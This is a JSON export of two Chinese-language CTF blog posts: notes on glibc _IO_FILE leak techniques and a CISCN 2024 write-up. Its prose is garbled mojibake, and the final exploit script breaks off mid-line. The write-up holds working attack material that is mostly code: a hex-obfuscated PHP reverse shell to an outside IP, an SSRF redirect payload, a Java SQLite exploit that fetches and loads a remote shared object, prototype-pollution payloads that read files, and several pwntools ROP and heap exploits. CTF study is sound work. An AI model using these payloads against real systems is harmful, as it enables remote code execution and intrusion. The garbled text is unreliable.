[{"title":"IO_FILE","url":"/2023/09/14/IO-FILE/","content":"éƒ¨åˆ†å †é¢˜æ²¡æœ‰ç»™äºˆæˆ‘ä»¬æ‰“å°å †å—ä¸­é—´çš„æœºä¼š è¿™ç§æƒ…å†µä¸‹ æ— æ³•é€šè¿‡unsortedbinæ¥æ³„éœ²åŸºå€ è¿™é‡Œå­¦ä¹ ä¸€ç§æ–°åŠæ³• é€šè¿‡io fileæ¥æ³„éœ²åŸºå€\nåœ¨ä¸€ä¸ªç¨‹åºä¸­ åˆå§‹çš„æ–‡ä»¶æè¿°ç¬¦ä¸º1,2,3 åˆ†åˆ«å¯¹åº”ç€æ ‡å‡†è¾“å…¥ æ ‡å‡†è¾“å‡º æ ‡å‡†é”™è¯¯ å½“æˆ‘ä»¬è°ƒç”¨scanfå‡½æ•°æˆ–è€…readå‡½æ•°çš„æ—¶å€™ å°±ä¼šé€šè¿‡è°ƒç”¨æ–‡ä»¶æè¿°ç¬¦0æ¥ä»ç»ˆç«¯è¾“å…¥æ•°æ® ä¹Ÿå°±æ„å‘³ç€æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹æ¥åšåˆ°æ³„éœ²æ•°æ®\nFILE åœ¨ Linux ç³»ç»Ÿçš„æ ‡å‡† IO åº“ä¸­æ˜¯ç”¨äºæè¿°æ–‡ä»¶çš„ç»“æ„ï¼Œç§°ä¸ºæ–‡ä»¶æµã€‚ FILE ç»“æ„åœ¨ç¨‹åºæ‰§è¡Œ fopen ç­‰å‡½æ•°æ—¶ä¼šè¿›è¡Œåˆ›å»ºï¼Œå¹¶åˆ†é…åœ¨å †ä¸­ï¼Œç„¶åä»¥é“¾è¡¨çš„å½¢å¼ä¸²è”èµ·æ¥ï¼Œä½†ç³»ç»Ÿä¸€å¼€å§‹ä¼šè‡ªåŠ¨åˆ›å»ºçš„ä¸‰ä¸ªæ–‡ä»¶å³stdinã€stdoutã€stderrï¼Œå®ƒä»¬æ˜¯åœ¨libcä¸Šã€‚\nstruct _IO_FILE_plus&#123;    _IO_FILE    file;    _IO_jump_t   *vtable;&#125;\n_IO_FILEçš„æºç \nstruct _IO_FILE &#123;int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */#define _IO_file_flags _flags   /* The following pointers correspond to the C++ streambuf protocol. */  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */  char* _IO_read_ptr;   /* Current read pointer */  char* _IO_read_end;   /* End of get area. */  char* _IO_read_base;  /* Start of putback+get area. */  char* _IO_write_base; /* Start of put area. */  char* _IO_write_ptr;  /* Current put pointer. */  char* _IO_write_end;  /* End of put area. */  char* _IO_buf_base;   /* Start of reserve area. */  char* _IO_buf_end;    /* End of reserve area. */  /* The following fields are used to support backing up and undo. */  char *_IO_save_base; /* Pointer to start of non-current get area. */  char *_IO_backup_base;  /* Pointer to first valid character of backup area */  char *_IO_save_end; /* Pointer to end of non-current get area. */   struct _IO_marker *_markers;   struct _IO_FILE *_chain;   int _fileno;#if 0  int _blksize;#else  int _flags2;#endif  _IO_off_t _old_offset; /* This used to be _offset but it&#x27;s too small.  */ #define __HAVE_COLUMN /* temporary */  /* 1+column number of pbase(); 0 is unknown. */  unsigned short _cur_column;  signed char _vtable_offset;  char _shortbuf[1]; /*  char* _save_gptr;  char* _save_egptr; */ _IO_lock_t *_lock;#ifdef _IO_USE_OLD_IO_FILE&#125;;\n_IO_list_allå˜é‡ï¼Œå…¶æŒ‡å‘FILEé“¾è¡¨çš„å¤´éƒ¨ï¼Œç»“åˆä¸Šé¢çš„ç»“æ„ä½“å¯çŸ¥fileå¯¹åº”çš„å°±æ˜¯_IO_FILEç»“æ„ç±»å‹vtableå¯¹åº”çš„å°±æ˜¯_IO_jump_tç±»å‹ã€‚åœ¨æ²¡æœ‰åˆ›å»ºå…¶å®ƒæ–‡ä»¶ç»“æ„æ—¶ï¼Œ_IO_list_allæŒ‡å‘stderrï¼Œç„¶åä¾æ¬¡æ˜¯stdoutå’Œstdinï¼Œè¿™é‡Œé€šè¿‡åœ¨å‰é¢åŠ ä¸Šç»“æ„ä½“ç±»å‹å¯ä»¥è¯¦ç»†çš„æ‰“å°å…¶å†…å­˜æ•°æ®ä¿¡æ¯\npwndbg&gt; p /x *(struct _IO_FILE_plus *) _IO_list_all$1 = &#123;  file = &#123;    _flags = 0xfbad2086,     _IO_read_ptr = 0x0,     _IO_read_end = 0x0,     _IO_read_base = 0x0,     _IO_write_base = 0x0,     _IO_write_ptr = 0x0,     _IO_write_end = 0x0,     _IO_buf_base = 0x0,     _IO_buf_end = 0x0,     _IO_save_base = 0x0,     _IO_backup_base = 0x0,     _IO_save_end = 0x0,     _markers = 0x0,     _chain = 0x7ffff7dce760,     _fileno = 0x2,     _flags2 = 0x0,     _old_offset = 0xffffffffffffffff,     _cur_column = 0x0,     _vtable_offset = 0x0,     _shortbuf = &#123;0x0&#125;,     _lock = 0x7ffff7dcf8b0,     _offset = 0xffffffffffffffff,     _codecvt = 0x0,     _wide_data = 0x7ffff7dcd780,     _freeres_list = 0x0,     _freeres_buf = 0x0,     __pad5 = 0x0,     _mode = 0x0,     _unused2 = &#123;0x0 &lt;repeats 20 times&gt;&#125;  &#125;,   vtable = 0x7ffff7dca2a0&#125;\n_IO_file_jumpsï¼ŒåŒ *vtable\npwndbg&gt; p _IO_file_jumps$3 = &#123;  __dummy = 0,   __dummy2 = 0,   __finish = 0x7ffff7a6e2d0 &lt;_IO_new_file_finish&gt;,   __overflow = 0x7ffff7a6f2b0 &lt;_IO_new_file_overflow&gt;,   __underflow = 0x7ffff7a6efd0 &lt;_IO_new_file_underflow&gt;,   __uflow = 0x7ffff7a70370 &lt;__GI__IO_default_uflow&gt;,   __pbackfail = 0x7ffff7a71c00 &lt;__GI__IO_default_pbackfail&gt;,   __xsputn = 0x7ffff7a6d8d0 &lt;_IO_new_file_xsputn&gt;,   __xsgetn = 0x7ffff7a6d530 &lt;__GI__IO_file_xsgetn&gt;,   __seekoff = 0x7ffff7a6cb30 &lt;_IO_new_file_seekoff&gt;,   __seekpos = 0x7ffff7a70940 &lt;_IO_default_seekpos&gt;,   __setbuf = 0x7ffff7a6c7f0 &lt;_IO_new_file_setbuf&gt;,   __sync = 0x7ffff7a6c670 &lt;_IO_new_file_sync&gt;,   __doallocate = 0x7ffff7a600b0 &lt;__GI__IO_file_doallocate&gt;,   __read = 0x7ffff7a6d8b0 &lt;__GI__IO_file_read&gt;,   __write = 0x7ffff7a6d130 &lt;_IO_new_file_write&gt;,   __seek = 0x7ffff7a6c8b0 &lt;__GI__IO_file_seek&gt;,   __close = 0x7ffff7a6c7e0 &lt;__GI__IO_file_close&gt;,   __stat = 0x7ffff7a6d120 &lt;__GI__IO_file_stat&gt;,   __showmanyc = 0x7ffff7a71d80 &lt;_IO_default_showmanyc&gt;,   __imbue = 0x7ffff7a71d90 &lt;_IO_default_imbue&gt;&#125;\n_IO_FILEç»“æ„ä½“ä¸­ï¼Œ_chainå­—æ®µæŒ‡å‘ä¸‹ä¸€ä¸ªé“¾è¡¨èŠ‚ç‚¹,æ­¤å¤„æŒ‡å‘çš„æ˜¯stdout\npwndbg&gt;  p  *(struct _IO_FILE_plus *) stdout$1 = &#123;  file = &#123;    _flags = -72540028,     _IO_read_ptr = 0x0,     _IO_read_end = 0x0,     _IO_read_base = 0x0,     _IO_write_base = 0x0,     _IO_write_ptr = 0x0,     _IO_write_end = 0x0,     _IO_buf_base = 0x0,     _IO_buf_end = 0x0,     _IO_save_base = 0x0,     _IO_backup_base = 0x0,     _IO_save_end = 0x0,     _markers = 0x0,     _chain = 0x7ffff7dcda00 &lt;_IO_2_1_stdin_&gt;,     _fileno = 1, //æ–‡ä»¶æè¿°ç¬¦ï¼Œstderrçš„filenoå€¼ä¸º2ï¼Œstdoutçš„filenoå€¼ä¸º1    _flags2 = 0,     _old_offset = -1,     _cur_column = 0,     _vtable_offset = 0 &#x27;\\000&#x27;,     _shortbuf = &quot;&quot;,     _lock = 0x7ffff7dcf8c0 &lt;_IO_stdfile_1_lock&gt;,     _offset = -1,     _codecvt = 0x0,     _wide_data = 0x7ffff7dcd8c0 &lt;_IO_wide_data_1&gt;,     _freeres_list = 0x0,     _freeres_buf = 0x0,     __pad5 = 0,     _mode = 0,     _unused2 = &#x27;\\000&#x27; &lt;repeats 19 times&gt;  &#125;,   vtable = 0x7ffff7dca2a0 &lt;_IO_file_jumps&gt;&#125;\nåˆ©ç”¨_filenoå­—æ®µ_filenoçš„å€¼å°±æ˜¯æ–‡ä»¶æè¿°ç¬¦ï¼Œä½äºstdinæ–‡ä»¶ç»“æ„å¼€å¤´0x70åç§»å¤„æˆ‘ä»¬å¯ä»¥å°è¯•ç¯¡æ”¹_filenoä»¥é‡å®šä½éœ€è¦è¯»å–çš„æ–‡ä»¶ä¾‹å­ä¹‹åå†æ”¾\nIO_FILE_leak\nint _IO_new_file_overflow (FILE *f, int ch)&#123;  if (f-&gt;_flags &amp; _IO_NO_WRITES) /* SET ERROR */    &#123;      f-&gt;_flags |= _IO_ERR_SEEN;      __set_errno (EBADF);      return EOF;    &#125;  /* If currently reading or no buffer allocated. */  if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL)    &#123;      /* Allocate a buffer if needed. */      if (f-&gt;_IO_write_base == NULL)\t&#123;\t  _IO_doallocbuf (f);\t  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);\t&#125;      /* Otherwise must be currently reading.\t If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,\t logically slide the buffer forwards one block (by setting the\t read pointers to all point at the beginning of the block).  This\t makes room for subsequent output.\t Otherwise, set the read pointers to _IO_read_end (leaving that\t alone, so it can continue to correspond to the external position). */      if (__glibc_unlikely (_IO_in_backup (f)))\t&#123;\t  size_t nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;\t  _IO_free_backup_area (f);\t  f-&gt;_IO_read_base -= MIN (nbackup,\t\t\t\t   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);\t  f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;\t&#125;      if (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)\tf-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;      if (f-&gt;_mode &lt;= 0 &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))\tf-&gt;_IO_write_end = f-&gt;_IO_write_ptr;    &#125;  if (ch == EOF)    return _IO_do_write (f, f-&gt;_IO_write_base,\t\t\t f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);  if (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) /* Buffer is really full */    if (_IO_do_flush (f) == EOF)      return EOF;  *f-&gt;_IO_write_ptr++ = ch;  if ((f-&gt;_flags &amp; _IO_UNBUFFERED)      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == &#x27;\\n&#x27;))    if (_IO_do_write (f, f-&gt;_IO_write_base,\t\t      f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)      return EOF;  return (unsigned char) ch;&#125;\n\nå°†å †å—åˆ†é…åˆ°stdoutæŒ‡é’ˆå¤„å­˜å‚¨çš„_IO_2_1_stdout_è¯¥IO_FILEç»“æ„ä½“å¤„ä¿®æ”¹å…¶_flagsä¸º0xfbad1800ï¼Œå°†åé¢ä¸‰ä¸ªreadæŒ‡é’ˆç½®ç©ºå°†_IO_write_baseå¤„çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ”¹ä¸º0x58ï¼Œåé¢çš„_IO_write_ptrå’Œ_IO_write_endä¿æŒä¸å˜ã€‚ä¹‹åå½“ç¨‹åºé‡åˆ°putså‡½æ•°æ—¶å°±ä¼šæ‰“å°_IO_write_baseåˆ°_IO_write_pträ¹‹é—´çš„å†…å®¹æŒ‰ç…§ä¸Šé¢æ­¥éª¤æ”¹åŠ¨çš„è¯ï¼Œæˆ‘ä»¬æ³„éœ²å‡ºçš„ç¬¬ä¸€ä¸ªlibcåœ°å€æ˜¯_IO_file_jumpsã€‚å¸¸ç”¨çš„payloadå¦‚ä¸‹æ‰€ç¤ºï¼Œè‡³äºä¸ºå•¥éœ€è¦flags&#x3D;0xfbad1800ï¼ˆflagsä¹Ÿå¯ä»¥æ˜¯0xfbad3887ï¼‰ï¼Œè¿™é‡Œåˆ†æèµ·æ¥ååˆ†å¤æ‚ï¼Œå¯ä»¥å‚è§putsæºç ï¼Œåªèƒ½è¯´ä¸ºäº†è¾¾åˆ°è¾“å‡ºæ•ˆæœéœ€è¦è¿™æ ·è®¾ç½®å¦å¤–è¯¥flagsè¿™æ ·è®¾ç½®åªæ˜¯é’ˆå¯¹putså‡½æ•°ï¼Œå…¶ä½™æ‰“å°å‡½æ•°ç•¥æœ‰ä¸åŒã€‚\npayload = p64(0xfbad1800)+p64(0)*3+b&quot;\\x58&quot;\n\npayload = p64(0xfbad3887)+p64(0)*3+p8(0)\nå­˜ä¸€ä¸ªenvironæ³„éœ²æ ˆåœ°å€\np2 = p64(0xfbad1800) + p64(0) * 3 + p64(environ) + p64(environ + 8) * 2 #stdout -&gt; environ leak stack_addr\nå‰é¢çš„æ”»å‡»æ‰‹æ®µï¼Œä»¥åå†æ¥æ¢ç´¢å§~\n","categories":["heap"],"tags":["_IO_FILE"]},{"title":"CISCN2024åˆèµ›","url":"/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/","content":"Write up written by åƒçƒ§é¸¡ä¼š pwned\n\n\n\né˜Ÿä¼ä¿¡æ¯\nå¯†ç å­¦æœ‰ä¸€å¨å…¬å¼ä¸ä¼šåœ¨mdå†™ï¼Œå¾…ä¿®å¤\nWebSimple_phpè¿‡æ»¤äº†å¾ˆå¤šï¼Œä¸€å¼€å§‹èƒ½è¯»æ–‡ä»¶è¯»ç›®å½•ä½†æ˜¯æ²¡å•¥ç”¨\nphp -r phpinfo()ï¼›å‘ç°å¯ä»¥æ‰§è¡Œphpå‘½ä»¤php -r eval(hex2bin(substrhp -r phpinfo()ï¼›å‘ç°å¯ä»¥æ‰§è¡Œphpå‘½ä»¤php -r eval(hex2bin(substr(_24736f636b3d66736f636b6f70656e28223132302e37382e3133352e3637222c36363636293b6578656328222f62696e2f7368202d69203c2633203e263320323e263322293b,1)));åå¼¹shellå‘ç°æœ‰mysqlæœåŠ¡é»˜è®¤è´¦å·è¿›å»äº†ä¸€è·¯æ‰¾ä¸‹æ¥\n\n\neasycms_revengeåœ¨å®˜ç½‘ä¸Šå‘ç°æœ‰ä¸ª qrcode çš„ ssrf åŒæ—¶å‘ç°é¢˜ç›®ä¸Šæœ‰ flag.php\næˆ‘çŒœå°±æ˜¯ ssrf æ‰“ flag.php ç„¶åå‘½ä»¤æ‰§è¡Œ\næ‰¾ä»£ç ä¸­ qrcode ç›¸å…³çš„å‡½æ•°\n\n\n\nå…¶ä¸­ thumb åµŒå…¥äºŒç»´ç ä¸­é—´çš„ logo å›¾ç‰‡ URLï¼Œdr_catcher_data å‡½æ•°è·å– logo å›¾ç‰‡çš„æ•°æ®\n\nPayload\n/?s=api&amp;c=api&amp;m=qrcode&amp;text=1&amp;thumb=http://vps&amp;size=10&amp;level=1\n\nä¸€å¼€å§‹è¯•äº†ä¸€ä¸‹æ˜¨å¤©çš„å§¿åŠ¿ï¼Œä½†æ˜¯å‘ç°ä¸é€šäº†ï¼Œè¿”å›äº†ä¸€ä¸ªç±»ä¼¼å›¾ç‰‡è®¤è¯çš„ä¸œè¥¿ï¼Œæˆ‘çŒœæµ‹æœåŠ¡å™¨ä¸Šåšäº†ä¸€ä¸ªç±»ä¼¼å¼ºåˆ¶è®¤è¯å›¾ç‰‡ï¼ŒåŠ ä¸ª GIF89a è¯•è¯•\nGIF89a&lt;?phpecho &quot;GIF89a&quot;;header(&#x27;Location: http://127.0.0.1/flag.php?cmd=bashå¼¹shell&#x27;,true,302);exit();?&gt;\n\n\nezjava| å¤ç°ä¸€å¼€å§‹çœ‹åˆ° jdbc æˆ‘å°±ä»¥ä¸ºæ˜¯ jdbc æ‰“å„ç§ä¾èµ–ï¼Œ\n\nç»“æœçœ‹äº†ä¸€åœˆéƒ½æ²¡æœ‰è§åˆ°æ„Ÿè§‰èƒ½æ‰“çš„ï¼Œåé¢çŸ¥é“äº†ä¸€ä¸ª sqlite çš„ cveï¼ŒCVE-2023-32697\nå‚è€ƒ https://mp.weixin.qq.com/s/JY1C2LqOqbAQvJLIhG8prQ\nimport java.io.File;import java.net.URL;import java.sql.Connection;import java.sql.DriverManager;import java.sql.Statement;public class ciscn2024&#123;    public static void main(String[] args) throws Exception&#123;        Class.forName(&quot;org.sqlite.JDBC&quot;);        String url1 = &quot;http://110.41.152.140/evil.db&quot;;        String url2 = &quot;http://110.41.152.140/shell3.so&quot;;        String tmp = &quot;sqlite-jdbc-tmp-&quot;;        String db = tmp + new URL(url1).hashCode() + &quot;.db&quot;;        System.out.println(db);        String dll = tmp + new URL(url2).hashCode() + &quot;.so&quot;;        System.out.println(dll);        new File(db).delete();        new File(dll).delete();        DriverManager.getConnection(&quot;jdbc:sqlite::resource:&quot;+url1).close();        DriverManager.getConnection(&quot;jdbc:sqlite::resource:&quot;+url2).close();        Connection conn = DriverManager.getConnection(&quot;jdbc:sqlite:file:&quot;+db+&quot;?enable_load_extension=true&quot;);        Statement stmt = conn.createStatement();        String sql = &quot;select load_extension(&#x27;&quot;+dll+&quot;&#x27;,&#x27;dllmain&#x27;)&quot;;        stmt.execute(sql);    &#125;&#125;\n\nå…ˆåœ¨ vps å¼€ä¸ªç«¯å£ç„¶åè®©é¢˜ç›®è®¿é—®ä¸‹è½½åˆ°æœ¬åœ°\nPOST /jdbc/connect HTTP/1.1Host: pwn.challenge.ctf.show:28169Content-Type: application/json&#123;&quot;type&quot;:&quot;3&quot;,&quot;url&quot;:&quot;jdbc:sqlite::resource:http://110.41.152.140:81/evil.db&quot;&#125;------------------------------------------------------------------------------&#123;&quot;type&quot;:&quot;3&quot;,&quot;url&quot;:&quot;jdbc:sqlite::resource:http://110.41.152.140:81/evil.db&quot;,&quot;tableName&quot;:&quot;stu union select load_extension(&#x27;/tmp/sqlite-jdbc-tmp--1288104388.so&#x27;),1,1&quot;&#125;\n\nR |sanic| å¤ç°æºç \nfrom sanic import Sanicfrom sanic.response import text, htmlfrom sanic_session import Sessionimport pydash# pydash==5.1.2class Pollute:    def __init__(self):        passapp = Sanic(__name__)app.static(&quot;/static/&quot;, &quot;./static/&quot;)Session(app)@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])async def index(request):    return html(open(&#x27;static/index.html&#x27;).read())@app.route(&quot;/login&quot;)async def login(request):    user = request.cookies.get(&quot;user&quot;)    if user.lower() == &#x27;adm;n&#x27;:        request.ctx.session[&#x27;admin&#x27;] = True        return text(&quot;login success&quot;)    return text(&quot;login fail&quot;)@app.route(&quot;/src&quot;)async def src(request):    return text(open(__file__).read())@app.route(&quot;/admin&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])async def admin(request):    if request.ctx.session.get(&#x27;admin&#x27;) == True:        key = request.json[&#x27;key&#x27;]        value = request.json[&#x27;value&#x27;]        if key and value and type(key) is str and &#x27;_.&#x27; not in key:            pollute = Pollute()            pydash.set_(pollute, key, value)            return text(&quot;success&quot;)        else:            return text(&quot;forbidden&quot;)    return text(&quot;forbidden&quot;)if __name__ == &#x27;__main__&#x27;:    app.run(host=&#x27;0.0.0.0&#x27;)\n\næˆ‘ä»¬å¾—å…ˆè®¿é—® login æ‰èƒ½è®¿é—® admin\nå¦‚æœæƒ³è®¿é—® login çš„è¯æˆ‘ä»¬å¾—è®¾ç½® cookie ä¸º adm;nï¼Œæœäº†ä¸€ä¸‹è²Œä¼¼æ²¡æœ‰ä»€ä¹ˆå§¿åŠ¿ï¼Œçœ‹çœ‹å†…éƒ¨å®ç°\n\nåªèƒ½åŒ¹é… 0-7ï¼Œå¯ä»¥ç”¨ä¸ªå…«è¿›åˆ¶æ¥ç»•\n\nç„¶åçœ‹ admin\n\næœä¸€ä¸‹æœ‰ä¸ªåŸå‹é“¾æ±¡æŸ“ï¼ŒåŒæ—¶æˆ‘ä»¬éœ€è¦ç»•è¿‡å¯¹_.çš„åˆ¤æ–­\n\nå¯ä»¥ç”¨_\\\\.æ¥ç»•\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰ä¸ª src è·¯ç”±ï¼Œ\n@app.route(&quot;/src&quot;)async def src(request):    return text(open(__file__).read())\n\næ—¢ç„¶æˆ‘ä»¬çŸ¥é“å¯ä»¥åŸå‹é“¾æ±¡æŸ“ï¼Œé‚£ä¹ˆå¦‚æœæˆ‘ä»¬æ±¡æŸ“__file__é‚£ä¹ˆå°±å¯ä»¥åšåˆ° rce\n&#123;&quot;key&quot;:&quot;__init__\\\\\\\\.__globals__\\\\\\\\.__file__&quot;,&quot;value&quot;:&quot;/etc/passwd&quot;&#125;\n\nèƒ½å¤Ÿç®€å• rce äº†\nåœ¨ ctfshow ä¸Šå¯ä»¥ç›´æ¥è¯»å–ç¯å¢ƒå˜é‡å¾—åˆ° flag\nä½†æ˜¯é¢˜ç›®ä»£ç ä¸­è®¾ç½®äº†ä¸€ä¸ª static ç›®å½•ï¼Œæˆ‘ä»¬éœ€è¦çœ‹çœ‹è¿™ä¸ª static å‡½æ•°å’‹æ ·çš„\n\nexp\n&#123;&quot;key&quot;:&quot;__class__\\\\\\\\.__init__\\\\\\\\.__globals__\\\\\\\\.app.router.name_index.__mp_main__\\\\.static.handler.keywords.directory_handler.directory_view&quot;,&quot;value&quot;: True&#125;&#123;&quot;key&quot;:&quot;__class__\\\\\\\\.__init__\\\\\\\\.__globals__\\\\\\\\.app.router.name_index.__mp_main__\\\\.static.handler.keywords.directory_handler.directory._parts&quot;,&quot;value&quot;: [&quot;/&quot;]&#125;&#123;&quot;key&quot;:&quot;__init__\\\\\\\\.__globals__\\\\\\\\.__file__&quot;,&quot;value&quot;: &quot;/24bcbd0192e591d6ded1_flag&quot;&#125;\n\n\n\nPwngostacké¢˜ç›®è¯´æ˜Gopwn x ROP\nè§£é¢˜æ€è·¯æŠŠç¨‹åºæ‰“å´©å¯ä»¥æ‰“å°å †æ ˆä¿¡æ¯ï¼Œå¯ä»¥æ³„éœ²åœ°å€ï¼ˆgo çš„å­—ç¬¦ä¸²åœ°å€æ˜¯ä¸å˜çš„ï¼‰\n\nè¿œç¨‹æ‰“ä¸€æ¬¡ï¼Œè¿™ä¸ªæ˜¯ syscall\n\næ‰¾ gadget\n\nç¬¦å·è¡¨ä¸ä¼šä¿®å°±ä¸çœ‹é€†å‘äº†\nç›´æ¥ rop å¼€æ‰“\nfrom pwn import *from pwn import p64#p = process(&#x27;./gostack&#x27;)p = remote(&quot;8.147.133.230&quot;,33569)context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)elf = ELF(&#x27;./gostack&#x27;)syscall = 0x404043pop_rax_ret = 0x40f984pop_rdi_14_13_12_rbp_rbx_ret = 0x4a18a5pop_rsi_ret = 0x42138apop_rdx_ret = 0x4944ecbss = 0x05633A0#binsh = 0x000000c000073f70binsh = 0x000000c000043fd8 + 8vuln_main = 0x4A0880payload = p64(0)*58payload += p64(pop_rax_ret) + p64(59)+ p64(pop_rdi_14_13_12_rbp_rbx_ret) + p64(binsh) payload += p64(0)*5 + p64(pop_rdx_ret) + p64(0) + p64(pop_rsi_ret) + p64(0) +p64(syscall)+ p64(0) + b&#x27;/bin/sh\\x00&#x27;p.sendline(payload)p.interactive()\n\n\norange_cat_diaryé¢˜ç›®è¯´æ˜House of orange + malloc hook\nè§£é¢˜æ€è·¯add å…è®¸ 0x1000 çš„å †å—\n\nfree å’Œ show éƒ½åªæœ‰ä¸€æ¬¡\n\n\nedit å­˜åœ¨è¶Šç•Œä¿®æ”¹å’Œ edit after free\n\næ‰€ä»¥ä½¿ç”¨ edit èƒ½ä¿®æ”¹ topchunkï¼Œå†ç”³è¯·ä¸€ä¸ªå¤§å †å—å°±èƒ½ä½¿åŸ topchunk è¿›å…¥ unsortedbinï¼Œä»¥æ­¤æ³„éœ² libc åœ°å€\nfastbin attack ä¿®æ”¹ malloc hook ä¸º onegadgetï¼Œæœ€åå†æ¬¡ç”³è¯·å †å—æ—¶è§¦å‘ onegadget æ‹¿åˆ° shell\n\nfrom pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)elf = ELF(&#x27;./orange_cat_diary&#x27;)libc = ELF(&#x27;./libc-2.23.so&#x27;)#p = process([&quot;./ld-2.23.so&quot;,&quot;./orange_cat_diary&quot;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc-2.23.so&quot;&#125;)p = remote(&quot;8.147.133.9&quot;,31797)def debug():    gdb.attach(p)    pause()def add(size,content):    p.sendlineafter(b&quot;Please input your choice:&quot;,b&#x27;1&#x27;)    p.sendlineafter(b&quot;Please input the length of the diary content:&quot;,str(size))    p.recvuntil(b&quot;Please enter the diary content:\\n&quot;)    p.send(content)def delete():    p.sendlineafter(b&quot;Please input your choice:&quot;,b&#x27;3&#x27;)def edit(_size_,_payload_):    p.sendlineafter(b&quot;Please input your choice:&quot;,b&#x27;4&#x27;)    p.sendlineafter(b&quot;Please input the length of the diary content:&quot;,str(size))    p.sendlineafter(b&quot;content:&quot;,payload)def show():    p.sendlineafter(b&quot;Please input your choice:&quot;,b&#x27;2&#x27;)one = [0x45226,0x4527a,0xf03a4,0xf1247]p.sendlineafter(b&#x27;tell me your name.&#x27;, b&#x27;name&#x27;)add(0x108, b&#x27;a&#x27;)# debug()edit(0x110, b&#x27;b&#x27; * 0x108 + p64(0xef1))add(0x1000, b&#x27;c&#x27;)add(0x60, b&#x27;\\x00&#x27;)show()libc_base= u64((p.recv(6)).ljust(8,b&#x27;\\x00&#x27;)) - 0x3c5100one_gadget = libc_base+one[2]success(&#x27;libc:%s&#x27;%hex(libc_base))#input()_delete()realloc = libc.sym[&quot;__libc_realloc&quot;]edit(0x20, p64(libc_base + libc.symbols[&#x27;__malloc_hook&#x27;] - 0x23))add(0x60, b&#x27;d&#x27;)add(0x60, b&#x27;e&#x27;*0x13+p64(one_gadget))p.sendlineafter(b&#x27;choice:&#x27;, b&#x27;1&#x27;)p.sendlineafter(b&#x27;content:&#x27;, str(0x60))p.interactive()\n\nEzHeap| å¤ç°2.35 çš„å¸¦æ²™ç›’å †é¢˜ï¼Œå †é£æ°´ä¸ä¼šæ¢å¤ï¼ˆ\næ˜æ˜¾çš„ malloc2stack å orw\n\né«˜ç‰ˆæœ¬ + æ²™ç›’å †å—çš„å¥‡å¦™ç»“æ„\n\néœ€è¦å…ˆæ¢å¤å †å—\nfrom pwn import *from pwn import p64,u64#p = remote(&quot;&quot;,)p = process([&quot;./ld-linux-x86-64.so.2&quot;,&quot;./EzHeap&quot;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)elf = ELF(&quot;./EzHeap&quot;)libc = ELF(&quot;./libc.so.6&quot;)context(arch=&quot;amd64&quot;,os=&quot;linux&quot;,log_level=&quot;debug&quot;)def debug():    gdb.attach(p)    pause()def add(size,content):    p.recvuntil(b&#x27;choice &gt;&gt; &#x27;)    p.sendline(str(&#x27;1&#x27;))    p.recvuntil(b&#x27;size:&#x27;)    p.sendline(str(size))    p.recvuntil(b&#x27;content:&#x27;)    p.sendline(content)def delete(index):    p.sendlineafter(b&quot;choice &gt;&gt; &quot;,str(&#x27;2&#x27;))    p.sendlineafter(b&quot;idx:&quot;,str(index))def edit(index,size,content):    p.sendlineafter(b&quot;choice &gt;&gt; &quot;,str(&#x27;3&#x27;))    p.sendlineafter(b&quot;idx:&quot;,str(index))    p.sendlineafter(b&quot;size:&quot;,str(size))    p.sendafter(b&quot;content:&quot;,content)def show(index):    p.sendlineafter(b&quot;choice &gt;&gt; &quot;,str(&#x27;4&#x27;))    p.sendlineafter(b&quot;idx:&quot;,str(index))debug()add(0x200,b&quot;a&quot;)  #0add(0x200,b&quot;b&quot;)  #1add(0x200,b&quot;c&quot;)  #2add(0x200,b&quot;d&quot;)  #3add(0x200,b&quot;d&quot;)  #4#æ¢å¤sandboxé€ æˆçš„å †é£æ°´pause()#leak libc basepayload = b&#x27;a&#x27;*0x200+p64(0)+p64(0x421)edit(0,0x500,payload)delete(1)add(0x200,&quot;b&quot;)#debug()show(2)libc_base = u64((p.recv(6)).ljust(8,b&#x27;\\x00&#x27;)) - 0x21ace0success(&quot;libc_base : &quot;+hex(libc_base))pause()#leak heap base_delete(4)edit(3,0x500,b&#x27;a&#x27;*0x210)show(3)p.recvuntil(b&quot;a&quot;*0x210)heap_base = u64(p.recv(5).ljust(8,b&#x27;\\x00&#x27;)) &lt;&lt; 12success(&quot;heap_base : &quot;+hex(heap_base))pause()edit(3,0x500,b&#x27;a&#x27;*0x200+p64(0)+p64(0x211))add(0x200,&quot;b&quot;)IO_2_1_stdout = 